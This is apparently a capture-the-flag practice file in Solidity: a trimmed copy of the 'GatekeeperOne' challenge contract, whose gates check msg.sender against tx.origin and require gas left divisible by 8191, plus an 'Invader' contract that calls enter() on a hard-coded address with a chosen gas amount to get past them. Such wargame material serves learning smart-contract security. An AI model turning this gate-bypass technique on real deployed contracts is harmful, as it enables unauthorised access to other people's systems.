// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;
  uint public progress =  0;

  modifier gateOne() {
      
    require(msg.sender != tx.origin, "wrong address");
    progress = 1;
    _;
  }

  modifier gateTwo() {
    progress = gasleft();
    require(gasleft() % 8191 == 0, "wrong gas left");
    progress = 2;
    _;
  }



  function enter() public gateOne gateTwo returns (bool) {
          progress = 7;
    entrant = tx.origin;
    return true;
  }
}

contract Invader {
  GatekeeperOne contractInstance = GatekeeperOne(0xa42b1378D1A84b153eB3e3838aE62870A67a40EA);

  function invade(uint _gas) public {
    contractInstance.enter{gas: _gas}();
  }
}
